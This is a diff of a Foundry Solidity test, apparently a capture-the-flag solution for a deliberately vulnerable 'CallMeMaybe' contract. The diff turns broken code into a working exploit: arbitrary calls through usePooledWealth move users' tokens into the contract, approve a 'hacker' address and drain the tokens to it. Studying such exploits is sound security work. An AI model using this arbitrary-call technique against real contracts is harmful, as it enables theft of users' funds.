@@ -9,14 +9,13 @@ import "../mocks/marqToken.sol";
 contract CallMeMaybeTest is Test {
     CallMeMaybe public target;
     MarqToken public token;
-    address[] public users;
+    address[] public users = [address(0x01), address(0x02), address(0x03)];
 
 
     function setUp() public {
         CallMeMaybeHelper dontpeak = new CallMeMaybeHelper();
         target = dontpeak.deployed();
         token = dontpeak.token();
-        users = dontpeak.users();
     }
 
 
@@ -44,19 +43,19 @@ contract CallMeMaybeTest is Test {
         
 
         for (uint256 i; i < users.length; i++) {
-            address user = users.length;
-            bytes memory _calldataTransfer = abi.encodeCall(token.selector.safeTransferFrom, user, address(target), 100 ether);
-            target.usePooledWealth(_calldataTransfer, address(target));
+            address user = users[i];
+            bytes memory _calldataTransfer = abi.encodeCall(token.transferFrom, (user, address(target), 100 ether));
+            target.usePooledWealth(_calldataTransfer, address(token));
         }
 
-        bytes memory _calldataApprove = abi.encodeCall(token.selector.approve, hacker, type(uint256).max);
+        bytes memory _calldataApprove = abi.encodeCall(token.approve, (hacker, type(uint256).max));
         
-        target.usePooledWealth(_calldataApprove, address(target));
+        target.usePooledWealth(_calldataApprove, address(token));
 
-        token.safeTransferFrom(address(target), hacker, 601 ether);
+        token.transferFrom(address(target), hacker, 601 ether);
 
         vm.stopPrank();
-        assertGt(token.balanceOf(hacker), 301 ether);
+        assertGt(token.balanceOf(hacker), 300 ether);
     }
 
 }
